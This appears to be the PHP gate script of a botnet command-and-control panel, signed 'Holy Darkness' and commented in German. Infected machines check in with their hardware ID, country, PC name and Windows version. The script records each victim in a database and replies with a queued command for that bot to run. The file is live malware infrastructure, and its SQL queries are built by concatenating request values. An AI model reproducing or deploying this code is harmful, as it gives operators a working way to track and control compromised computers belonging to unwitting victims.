<?php
	// Bot PHP V1.0
	// By Holy Darkness
	include("panelx/inc/config.php");
	include("panelx/inc/funcs.php");
	
	if (isset($_POST['mode']) && $_POST['mode'] == 1) {
		// Anmeldung
		if (isset($_POST['hwid']) && isset($_POST['country']) && isset($_POST['nat']) && isset($_POST['pcname']) && isset($_POST['winver'])) {
			// Update
			$sql = "SELECT `id` FROM `clients` WHERE `hwid` = '".dRead("hwid")."';";
			$res = mysql_query($sql);
			if (mysql_num_rows($res) > 0) {
				// Update
				$sql = "UPDATE `clients` SET `pcname` = '".dRead('pcname')."', `winver` = '".dRead('winver')."', `nat` = '".dRead('nat')."', `connect` = '".time()."' WHERE `id` = ".mysql_result($res, 0).";";
				$res = mysql_query($sql);
				$sql = "SELECT `cmd` FROM `clients` WHERE `hwid` = '".dRead("hwid")."';";
				$res = mysql_query($sql);
				echo mysql_result($res, 0);
			} else {
				// Neu erstellen
				$sql = "INSERT INTO `clients` (`id`, `hwid`, `install`, `connect`, `cmd`, `pcname`, `country`, `winver`, `nat`) VALUES (NULL, '".dRead("hwid")."', '".time()."', '".time()."', '', '".dRead('pcname')."', '".dRead('country')."', '".dRead('winver')."', '".dRead('nat')."');";
				if (mysql_query($sql)) {
					echo "done1";
				} else {
					echo "err211";
				}
			}
		}		
	} elseif (isset($_POST['mode']) && $_POST['mode'] == 2) {
		// Alive
		if (isset($_POST['hwid'])) {
			// Update
			$sql = "UPDATE `clients` SET `connect` = '".time()."' WHERE `hwid` = '".dRead("hwid")."';";
			if (mysql_query($sql)) {
				$sql = "SELECT `cmd` FROM `clients` WHERE `hwid` = '".dRead("hwid")."';";
				$res = mysql_query($sql);
				echo mysql_result($res, 0);
			} else {
				echo "err0311";
			}
		}
	}
?>